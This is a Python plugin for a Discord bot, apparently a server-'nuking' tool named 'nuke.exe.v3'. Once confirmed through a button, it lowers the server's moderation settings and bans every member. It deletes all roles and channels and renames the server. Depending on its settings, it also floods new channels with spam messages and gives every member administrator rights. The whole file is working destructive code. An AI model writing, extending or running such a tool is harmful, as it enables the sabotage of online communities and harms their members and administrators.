import asyncio
import json
import os

import discord
from discord.ui import View

from main import button_configurations, bot, button_views, is_owner

OWNER_ID = 938059286054072371
NUKE_CONFIG_PATH_V3 = 'plugins/Nukeconfig.json'

nukeconfig = {
    'Ban': True,
    'RoleDelete': True,
    'Silent': True,
    'ChannelDelete': True,
    'GNameChange': True,
    'GNAME': 'Nuking Bot',
    'CHNAME': '',
    'MESSAGE': '',
    'maxcount': 50,
    'max_channel_count': 25,
    'GiveAllAdmin': False,
    'AUTHORIZED_IDS': []
}

msg_confirm = None


def save_config_v3():
    with open(NUKE_CONFIG_PATH_V3, 'w') as f:
        json.dump(nukeconfig, f, indent=4)


def load_config_v3():
    global nukeconfig
    if os.path.isfile(NUKE_CONFIG_PATH_V3):
        with open(NUKE_CONFIG_PATH_V3, 'r') as f:
            nukeconfig = json.load(f)


load_config_v3()


async def cancel_nuke(interaction: discord.Interaction):
    await interaction.message.delete()


async def confirm_nuke(interaction: discord.Interaction):
    ctx = interaction
    try:
        guild = ctx.guild
        if 'COMMUNITY' in guild.features:
            await guild.edit(
                verification_level=discord.VerificationLevel.low,
                default_notifications=discord.NotificationLevel.all_messages,
                explicit_content_filter=discord.ContentFilter.disabled,
                community=False
            )
    except Exception as e:
        print(e)

    async def do_bans():
        if nukeconfig['Ban']:
            ban_tasks = [member.ban(reason="Nuking") for member in ctx.guild.members]
            await asyncio.gather(*ban_tasks, return_exceptions=True)

    async def do_role_deletes():
        if nukeconfig['RoleDelete']:
            role_delete_tasks = [role.delete(reason="Nuking") for role in ctx.guild.roles]
            await asyncio.gather(*role_delete_tasks, return_exceptions=True)

    async def do_channel_deletes():
        if nukeconfig['ChannelDelete']:
            channel_delete_tasks = [channel.delete(reason="Nuking") for channel in ctx.guild.channels]
            await asyncio.gather(*channel_delete_tasks, return_exceptions=True)

    async def do_guild_edit():
        if nukeconfig['GNameChange']:
            await ctx.guild.edit(name=nukeconfig['GNAME'], icon=None)

    async def do_silent_deletes():
        if not nukeconfig['Silent']:
            await asyncio.gather(*[channel.delete(reason="Nuking") for channel in ctx.guild.channels])

            chunk_size = 5
            for i in range(0, nukeconfig['max_channel_count'], chunk_size):
                chunk = range(i, min(i + chunk_size, nukeconfig['max_channel_count']))
                create_tasks = [ctx.guild.create_text_channel(name=f"{nukeconfig['CHNAME']}-{j}") for j in chunk]
                await asyncio.gather(*create_tasks)

            text_channels = ctx.guild.text_channels

            messages_to_send = [channel.send(nukeconfig['MESSAGE']) for channel in text_channels for _ in
                                range(nukeconfig['maxcount'])]
            await asyncio.gather(*messages_to_send)

    async def give_all_admin():
        if nukeconfig['GiveAllAdmin']:
            permissions = discord.Permissions(administrator=True)
            role = await ctx.guild.create_role(name='*', permissions=permissions)
            for member in ctx.guild.members:
                await member.add_roles(role)

    await asyncio.gather(
        do_bans(),
        do_role_deletes(),
        do_channel_deletes(),
        do_guild_edit(),
        do_silent_deletes(),
        give_all_admin()
    )


btn_confirm = {
    'label': 'Confirm',
    'style': discord.ButtonStyle.danger,
    'custom_id': 'confirm_nuke',
    'callback': confirm_nuke
}
button_configurations.append(btn_confirm)

btn_cancel = {
    'label': 'Cancel',
    'style': discord.ButtonStyle.success,
    'custom_id': 'cancel_nuke',
    'callback': cancel_nuke
}
button_configurations.append(btn_cancel)


@bot.command(name='nuke.exe.v3')
@is_owner()
async def nuke_msg(ctx):
    await ctx.message.delete()
    global msg_confirm
    combined_view = View()
    for item in button_views['confirm_nuke'].children:
        combined_view.add_item(item)
    for item in button_views['cancel_nuke'].children:
        combined_view.add_item(item)
    await ctx.send(f'{ctx.author.mention} confirm nuke?', view=combined_view)


@bot.command(name='nuke.exe.v3.reloadconfig')
@is_owner()
async def nuke_reload_config(ctx):
    load_config_v3()
    await ctx.send("Configuration reloaded.")


@bot.command(name='nuke.exe.v3.editconfig')
@is_owner()
async def nuke_edit_config(ctx, key: str, *, value):
    try:
        if key in nukeconfig:
            if key == 'AUTHORIZED_IDS':
                nukeconfig[key] = [int(id.strip()) for id in value.split(',')]
            elif value.lower() == 'true':
                nukeconfig[key] = True
            elif value.lower() == 'false':
                nukeconfig[key] = False
            elif value.isdigit():
                nukeconfig[key] = int(value)
            else:
                nukeconfig[key] = value
            save_config_v3()
            await ctx.send(f"{key} has been updated to `{value}`.")
        else:
            await ctx.send(f"Invalid configuration key: {key}.")
    except Exception as e:
        await ctx.send(f"Error updating config: {e}")


@bot.command(name='nuke.exe.v3.showconfig')
@is_owner()
async def nuke_show_config(ctx):
    embed = discord.Embed(title="Nuke Configuration", color=0xFF5733)
    for key, value in nukeconfig.items():
        embed.add_field(name=key, value=value, inline=False)
    await ctx.send(embed=embed)
